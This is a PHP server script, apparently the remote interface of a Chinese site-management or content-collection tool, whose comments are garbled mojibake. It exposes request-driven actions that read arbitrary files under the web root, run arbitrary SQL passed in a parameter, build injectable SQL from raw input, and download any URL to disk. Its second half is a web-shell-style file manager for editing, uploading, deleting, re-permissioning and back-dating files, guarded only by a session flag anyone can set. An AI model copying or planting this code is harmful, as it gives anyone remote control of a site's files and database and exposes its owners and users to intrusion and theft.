<?php
ob_start();
session_start();
//����������ļ�
if (!file_exists('ccs_func.php'))
{
	exit("<code>999</code><desc>ccs_func.php ������</desc>");	
}
include_once('ccs_const.php');
include_once('ccs_func.php');
include_once('ccs_config.php');

$act = strtolower(trim($_REQUEST['act']));

//1����ȡ��ǰ׺
if($act=="get_table_pre")
{
	exit('<code>0</code><desc>'.$db_tablepre.'</desc>');	 
} else
//2���������������ļ�
if($act=="rewriteconfig")
{
	$sys_config_name  = trim($_REQUEST['sys_config_name']);//��������
	$sys_config_value = trim($_REQUEST['sys_config_value']);//�������ֵ 
	if($ccs_site_type=="dede")
	{		
		db_connect($db_host ,$db_name ,$db_user ,$db_pwd ,$db_charset);
		if($sys_config_name!="")
		{			
			$result = db_query("update {$db_tablepre}sysconfig set value='$sys_config_value' where varname='$sys_config_name'");
			if($result!=1) exit($result);
		}
		
		$result = DeDe_ReWriteConfig($db_tablepre);	
		mysql_close();
		exit($result);	
	}else
	{
		exit('<code>999</code><desc>�ӿڲ�֧�ָò���</desc>');
	}			 
} else
//x����ȡ�ļ�����(�����ڵ�ǰվ��, filenameΪ�������վ��Ŀ¼���ļ���)
if($act=="get_file")
{	
	$filename = trim($_REQUEST['filename']);
	if(stripos($filename,':')>0)
	{		
		$filename = str_ireplace($_SERVER['DOCUMENT_ROOT'],'',$filename);					
	}	
	if($filename[0]!='/')
	{
		$filename = $_SERVER['DOCUMENT_ROOT'].'/'.$filename;
	}else
	{
		$filename = $_SERVER['DOCUMENT_ROOT'].$filename;
	}
	$content = file_get_contents($filename);
	
	exit($content);	
} else
//x���޸��ļ�����(�����ڵ�ǰվ��, filenameΪ�������վ��Ŀ¼���ļ���)
if($act=="set_file")
{
	exit('<code>0</code><desc>'.$db_tablepre.'</desc>');	 
} else
//2��ִ��SQL���
if($act=="exec_sql")
{
	db_connect($db_host ,$db_name ,$db_user ,$db_pwd ,$db_charset);
	$sql = trim($_REQUEST['sql']);	
	db_execsql_as_xml("$sql",$db_tablepre);
	mysql_close();
	exit();
}else
//3������תͼƬ
if($act=="char2img")
{
	/*
	���ܣ�����תͼƬ
	ע�����
		1������c:\windows\simhei.ttf �ļ��� D://APMServ5.2.6//tmp//uploadtemp//simhei.ttf
		2����վ�� ccs Ŀ¼Ҫ����ȫ����Ȩ��		
	��Σ�
		act  �������� char2img
		strs ��Ҫת����ͼƬ�б����� | ���зָ�
	*/
	//ͼƬ����·��,������·��  ccs/img/ Ŀ¼����
	$savepath = $_SERVER['DOCUMENT_ROOT'];
	if (isset($charpath))
	{
		if($charpath!='') 
			$savepath = $savepath.$charpath;
		else
			$savepath = $savepath."/ccs/img/";		
	}
	//$savepath = str_ireplace("/","\\",$savepath); 
	if(!is_dir($savepath))
	{
		mkdirs($savepath);
	}
	
	
	//�������
	$strs = trim($_REQUEST['strs']);  //Ҫ�������ַ����б�����|�ָ�
	
	//font�ļ�·��	
	$font = trim($_REQUEST['font']);//���� ���壬�źڣ����壬����
	$size = trim($_REQUEST['size']);//���ִ�С ������ 1-100
	$bg_r = trim($_REQUEST['bg_r']);//����ɫ red
	$bg_g = trim($_REQUEST['bg_g']);//����ɫ green
	$bg_b = trim($_REQUEST['bg_b']);//����ɫ blue
	$ft_r = trim($_REQUEST['ft_r']);//������ɫ red
	$ft_g = trim($_REQUEST['ft_g']);//������ɫ green
	$ft_b = trim($_REQUEST['ft_b']);//������ɫ blue
	
	//...����
	if($font=="����")
	{
		$f = 'simsong.ttf';
	}else
	if($font=="�ź�")
	{
		$f = 'msyahei.ttf';
	}else
	if($font=="����")
	{
		$f = 'simkai.ttf';
	}else
	{
		$f = 'simhei.ttf';	
	}	
	
	$path = get_cfg_var("extension_dir");
	$path = explode("APMServ5.2.6",$path);
	$path = $path[0];	
	$path = $path."/APMServ5.2.6//tmp//uploadtemp//";	
	$fontfile = $path.$f;	
	if(!file_exists($fontfile))
	{
		$fontfile = $path."simhei.ttf";
		if(!file_exists($fontfile))
		{
			exit("<code>999</code><desc>�����ļ������ڣ����ϴ������ļ���[$path]//Ŀ¼��</desc>");
		}	
	}		
	
	//�ָ��ַ���Ϊ����
	$strArr = explode("|",$strs);
	for ($i=0; $i<sizeof($strArr); $i++)
	{
	  $char = $strArr[$i];
	  $imgfile = $savepath.strToHex($char).".png";
	  //...�ļ������ھʹ���
	  if(!file_exists($imgfile))
	  {	  	
	  	Char2Image($char,$imgfile,$fontfile ,$size,$bg_r,$bg_g,$bg_b,$ft_r,$ft_g,$ft_b);
	  }
	}
	echo "<code>0</code><desc>����תͼƬ�ɹ���</desc>";	
	exit();
}else
//4��ѹ����վ�ļ�
if($act=="rar")
{
		/*
	���ܣ����ݷ����
	ǰ��������
		1��mysql���ݿ��˺ţ�Ҫ�С��������񡿵�Ȩ��
		2��ѹ���ļ� rar.exe ·�� C:\Program Files\WinRAR\Rar.exe
		3��apache·�� D:\APMServ5.2.6\MySQL5.1\bin  �� E:\APMServ5.2.6\MySQL5.1\bin ���·����֧��
						
	
	1���ж��Ƿ�ѹ�����ʾ����
		����http://127.0.0.1?act=query_rar_status
		���أ�<code>0</code><desc><db>0</db><web>0</web></desc>
		
	2�����ͱ�������	
		����http://127.0.0.1?act=rar&db=1&web=1
		���أ�<code>0</code><desc><web>http://127.0.0.1/db.rar</web><db>http://127.0.0.1/web.rar</db></desc>
	
	3��������ɣ�ɾ����ʱ�ļ�	
	����http://127.0.0.1?act=rar_del&db=dbfile&web=webfile
	���أ�<code>0</code><desc></desc>		
	*/

//bat �ļ�������	

	//...1���������ݿ�
	db_connect($db_host ,$db_name ,$db_user ,$db_pwd ,$db_charset);	
	
	//...�������ò�����ֻ��Ҫ���������	
	$site     = $_SERVER ["HTTP_HOST"];     //վ������
	$dbname   = $db_name;                   //���ݿ�����
	$webfile  = $_SERVER['DOCUMENT_ROOT'];  //��վ��Ŀ¼
	
	$curtime = time();//��ǰʱ���
	
	$rar_dbfile  = $webfile.'/ccs/db_'.$curtime;
	$rar_webfile = $webfile.'/ccs/web_'.$curtime;
	
	$rar_web = trim($_GET['web']);      //�Ƿ�ѹ����վ�ļ� 1 �� 0 ��
	$rar_db  = trim($_GET['db']);       //�Ƿ�ѹ����վ�ļ� 1 �� 0 ��
	if(($rar_db=="0")||($rar_db==""))
	{
		$rar_dbfile = "";
		$http_db = "";
	}else
	{
		$http_db = "http://".$site."/ccs/db_".$curtime.".rar";
	}
	
	if(($rar_web=="0")||($rar_web==""))  
	{
		$rar_webfile = "";	
		$http_web = "";	
	}else
	{
		$http_web = "http://".$site."/ccs/web_".$curtime.".rar";
	}
	if(($rar_dbfile=="")&&($rar_webfile==""))
	{
		echo '<code>999</code><desc>��δ���û��ָ��Ҫ���ݵ���Ŀ�����ݿ����վ�ļ���û��ָ����</desc>'; 
		exit;
	}	
	
	$sql = "select * from mysql.backuptask where site='$site'";
	$result = db_query($sql);
	if(mysql_num_rows($result)==0)
	{
		$sql = "insert into mysql.backuptask(site,rar_dbfile,rar_webfile,dbname,webfile) values('$site','$rar_dbfile','$rar_webfile','$dbname','$webfile')";		
		db_query($sql);
	}else
	{
		echo '<code>999</code><desc>����δ��ɵ���ͬ����!</desc>'; 
		exit;
	}		
	
	$result = "<code>0</code><desc><db>$http_db</db><web>$http_web</web></desc>";//�����ַ���
	echo $result;
	mysql_close();
	exit();
}else
/*5�������ѯѹ���Ƿ����*/
if($act=="query_rar_status")
{	
	db_connect($db_host ,$db_name ,$db_user ,$db_pwd ,$db_charset);	
	$site   = $_SERVER ["HTTP_HOST"];     //վ������
	$sql = "select * from mysql.backuptask where status='1' and site='$site'";
	$result = db_query($sql);
	if(mysql_num_rows($result)==0)
	{
		echo '<code>0</code>';
	}else
	{
		echo '<code>1</code>';
	}
	mysql_close();
	exit();
}else
/*6��������ɣ��ͻ�������ɾ��ѹ�����ļ�*/
if($act=="rar_del")
{
	db_connect($db_host ,$db_name ,$db_user ,$db_pwd ,$db_charset);	
	$site   = $_SERVER ["HTTP_HOST"];     //վ������
	$sql = "update mysql.backuptask set status='2' where status='1' and site='$site'";
	$result = db_query($sql);
	echo "<code>0</code><desc>����ɾ������ɹ�</desc>";
	mysql_close();
	exit();
}else
//DEMO: http://www.quanxunnet.com/ccs/ccs_execsql.php
//POST: act=downfile&from=http%3A%2F%2Fimgmil%2Egmw%2Ecn%2Fattachement%2Fjpg%2Fsite2%2F20110523%2Fb8ac6f402aaf0f4403b728%2Ejpg&site=imgmil.gmw.cn&file=E18E0857CB6B7FE268920FC27197FD04.jpg&verifycode=uotzgilsqqsuctmkethjanzjlsecouol
if($act=="downfile")
{
	$from = $_REQUEST['from'];
	$from = urldecode($from); //������ַ
	$site = $_REQUEST['site']; //����վ��
	$file = $_REQUEST['file']; //���ر����ļ��� md5.xxx	
	
	//...�����ļ�����·�����������ļ���
	$dir = "";
	if (isset($attachpath))
	{
		if($attachpath!='')
		{
			$dir = $_SERVER['DOCUMENT_ROOT'].$attachpath.$site."/";			
		}		
	}
	if($dir=="")
	{	
		$dir = dirname(__FILE__);	
		$dir = str_ireplace('\\','/',$dir);		
		$dir = $dir."/attach/".$site."/";
	}
	mkdirs($dir);//����Ŀ¼
	$file = $dir.$file;
	
	//...���ز������ļ�
	if(!file_exists($file))
	{
		$opts = array('http'=>array('method'=>"GET",'header'=>"Content-type: application/x-www-form-urlencoded\r\n"."Referer: ".$from."\r\n"));   
		$cxContext = stream_context_create($opts);   
		$content = file_get_contents($from,false,$cxContext);		
		file_put_contents($file , $content);
	}
	
	if(file_exists($file))
	{
		//2011-05-23 18:39 HST ����ͼƬ�ߴ�(�����ͼƬ)
		//2011-07-01 12:12 hst ����·����Ϊ��̬
		//2011-08-02 16:29 jxf �ĳɾ���·����ֱ�ӵ����ϱ����ɵ�·��
		$arr=getimagesize($file);
		$result = "<code>0</code><desc><img ".$arr[3]."/></desc>";
	}else
	{
		$result = "<code>999</code><desc>����ʧ��</desc>";
	}
	echo $result;	
	exit();
}	

/*������ʹ�õ��ĺ����б�*/
//�����༶Ŀ¼
function mkdirs($dir, $mode = 0777)
{
	if(is_dir($dir)||@mkdir($dir, $mode)) return TRUE; 
	if (!mkdirs(dirname($dir), $mode)) return FALSE; 
	return @mkdir($dir, $mode); 
}

//�ַ���ת16����
function strToHex($string)   
{   
	$hex="";   
	for($i=0;$i<strlen($string);$i++)   
	$hex.=dechex(ord($string[$i]));   
	$hex=strtoupper($hex);   
	return $hex;   
}  
//16����ת�ַ���
function hexToStr($hex)   
{   
	$string="";   
	for($i=0;$i<strlen($hex)-1;$i+=2)   
	$string.=chr(hexdec($hex[$i].$hex[$i+1]));   
	return $string;   
} 

//����תͼƬ png��ʽ��
function Char2Image($char,$savepath,$fontfile ,$size,$bg_r,$bg_g,$bg_b,$ft_r,$ft_g,$ft_b)
{
	if($char=="") exit;
	
	if($size<=11)
	{		
		$w  = 14;
		$h  = 14;
		$x1 = 1;
		$x2 = 1;
		$y  = 12;		
	}else
	{
		$w  = $size + 6;
		$h  = $size + 6;
		$x1 = 1;		
		$x2 = 1;
		$y  = $size+2;			
	}
	
	$img=ImageCreate($w,$h); //������
	//int imagecolorallocate ( resource image, int red, int green, int blue)
	$bgcolor=ImageColorAllocate($img,$bg_r,$bg_g,$bg_b);   
	$fontcolor=ImageColorAllocate($img,$ft_r,$ft_g,$ft_b);  	
	$str =iconv('gb2312','utf-8',$char); 	
	if(ord($char)<123)//��ĸ������
	{
		//array imagettftext ( resource image, int size, int angle, int x, int y, int color, string fontfile, string text)
		imagettftext($img,$size,0,$x1,$y,$fontcolor,$fontfile,$str);  
	}else//����
	{
		imagettftext($img,$size,0,$x2,$y,$fontcolor,$fontfile,$str);
	}
	ImagePng($img,$savepath);
	ImageDestroy($img);
}
?> 


<?php
/*
	��վ�������  2011-05-24 20:51
*/
if($_REQUEST['act']=="filemanager")
{
	$_SESSION["act"]="filemanager";	
}
if($_SESSION["act"]!="filemanager") 
{
	exit('<code>999</code><desc>�Ƿ���¼</desc>');	
}

if (!file_exists('ccs_func.php'))
{
	exit("<code>999</code><desc>ccs_func.php ������</desc>");	
}
include_once('ccs_func.php');
$password = $verifycode;//
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);

function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", "����",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#BBBBBB;}
	table{color:#000000;font-family:"Verdana", "Tahoma", "����",sans-serif;font-size:13px;border:1px solid #999999;}
	td{background:#F9F6F4;}
	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}

//�ļ�����
class packdir
{
	var $out = '';
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function packdir($array)
	{
		if(@function_exists('gzcompress'))
		{
			for($n = 0;$n < count($array);$n++)
			{
				$array[$n] = urldecode($array[$n]);
				$fp = @fopen($array[$n], 'r');
				$filecode = @fread($fp, @filesize($array[$n]));
				@fclose($fp);
				$this -> filezip($filecode,basename($array[$n]));
			}
			@closedir($zhizhen);
			$this->out = $this->packfile();
			return true;
		}
		return false;
	}
	function at($atunix = 0)
	{
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980)
		{
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		} 
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	function filezip($data, $name, $time = 0)
	{
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function packfile()
	{
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Size($size)
{
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function File_Up($filea,$fileb)
{
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}

function FileFile_Down($filename)
{
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}

function File_Deltree($deldir)
{
	if(($mydir = @opendir($deldir)) == NULL) return false;	
	while(false !== ($file = @readdir($mydir)))
	{
		$name = File_Str($deldir.'/'.$file);
		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
		if(is_file($name)){@chmod($name,0777);@unlink($name);}
	} 
	@closedir($mydir);
	@chmod($deldir,0777);
	return @rmdir($deldir) ? true : false;
}

function File_Act($array,$actall,$inver)
{
	if(($count = count($array)) == 0) return '��ѡ���ļ�';
	if($actall == 'e')
	{
		$zip = new packdir;
		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
		return '�����ѡ�ļ�ʧ��';
	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '·������'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '���Ƶ�'.$inver.'Ŀ¼'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'ɾ��'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '����ֵ����'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '�����޸�Ϊ'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '�޸�ʱ��Ϊ'.$inver; break;
		}
		$i++;
	}
	return '��ѡ�ļ�'.$msg.'���';
}

function File_Edit($filepath,$filename,$dim = '',$password)
{
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = File_Str($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('���ڸ�ʽ����ȷ!��ʽ:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">��������: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="����" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}&verifycode=$password">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">�ļ��޸�ʱ�� <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input type="button" value="����" onclick="CheckDate();" style="width:80px;">
<input type="button" value="����" onclick="window.location='?s=a&p={$THIS_DIR}&verifycode=$password';" style="width:80px;"></div>
</form>
END;
}

function File_Soup($p,$password)
{
	$THIS_DIR = urlencode($p);
	$UP_SIZE = get_cfg_var('upload_max_filesize');
	$MSG_BOX = '��������������С:'.$UP_SIZE.', ������ʽ(new.php),��Ϊ��,�򱣳�ԭ�ļ���.';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			$i = 0;
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					$souptmp = $_FILES['soup']['tmp_name'][$key];
					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'�ϴ��ɹ�' : $soupname.'�ϴ�ʧ��';
				}
				$i++;
			}
		}
		else
		{
			$MSG_BOX = '��ѡ���ļ�';
		}
	}
print<<<END
<div class="msgbox">{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}&verifycode=$password" enctype="multipart/form-data">
<div class="actall">�ϴ���Ŀ¼: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">����1 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
<div class="actall">����2 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
<div class="actall">����3 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
<div class="actall">����4 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
<div class="actall">����5 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
<div class="actall">����6 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
<div class="actall">����7 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
<div class="actall">����8 <input type="file" name="soup[]" style="width:300px;height:22px;"> ���� <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
<div class="actall"><input type="submit" value="�ϴ�" style="width:80px;"> <input type="button" value="����" onclick="window.location='?s=a&p={$THIS_DIR}&verifycode=$password';" style="width:80px;"></div>
</form>
END;
}

function File_a($p,$password)
{	
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$MSG_BOX = '�ȴ���Ϣ����';
	$UP_DIR = urlencode(File_Str($p.'/..'));
	$REAL_DIR = File_Str(realpath($p));
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
	$THIS_DIR = urlencode(File_Str($REAL_DIR));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '�༭�ļ� '.$_POST['pfn'].' �ɹ�' : '�༭�ļ� '.$_POST['pfn'].' ʧ��';@touch($_POST['pfn'],$intime);}
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '�ϴ��ļ� '.$upfilename.' �ɹ�' : '�ϴ��ļ� '.$upfilename.' ʧ��';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '����ֵ����'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '�޸� '.$modfile.' ����Ϊ '.$_GET['md'].' �ɹ�' : '�޸� '.$modfile.' ����Ϊ '.$_GET['md'].' ʧ��';}
	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '���� '.$_GET['mn'].' Ϊ '.$_GET['rn'].' �ɹ�' : '���� '.$_GET['mn'].' Ϊ '.$_GET['rn'].' ʧ��';}
	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '����Ŀ¼ '.$_GET['dn'].' �ɹ�' : '����Ŀ¼ '.$_GET['dn'].' ʧ��';}
	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'ɾ��Ŀ¼ '.$_GET['dd'].' �ɹ�' : 'ɾ��Ŀ¼ '.$_GET['dd'].' ʧ��';}
	if(isset($_GET['df'])){if(!FileFile_Down($_GET['df'])) $MSG_BOX = '�����ļ�������';}
	Root_CSS();
print<<<END
<script type="text/javascript">

	function Inputok(msg,gourl)
	{
		smsg = "��ǰ�ļ�:[" + msg + "]";
		re = prompt(smsg,unescape(msg));		
		if(re)
		{
			var url = gourl + escape(re);
			url = url + '&verifycode='+ '$password';
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "ȷ��Ҫɾ��[" + unescape(msg) + "]��?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = escape(gourl);
				document.getElementById('fileall').submit();
			}
			else window.location = gourl+'&password='+$password;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "��ǰ�ļ�ʱ��:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('���ڸ�ʽ����ȷ!��ʽ:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
	<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
	<div class="actall" style="text-align:center;padding:3px;">	
	<div style="margin-top:3px;"></div>
	<form method="POST" action="?s=a&p={$THIS_DIR}&verifycode=$password" enctype="multipart/form-data">
	<input type="button" value="�½��ļ�" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input type="button" value="�½�Ŀ¼" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="button" value="�����ϴ�" onclick="window.location='?s=q&p={$REAL_DIR}&verifycode=$password';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" value="�ϴ�" style="width:50px;">
	</form>
	</div>
	<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}&verifycode=$password">
	<table border="0"><tr>
	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}&verifycode=$password"><b>�ϼ�Ŀ¼</b></a> </td>
	<td class="toptd" style="width:100px;"> ���� </td>
	<td class="toptd" style="width:55px;"> ���� </td>
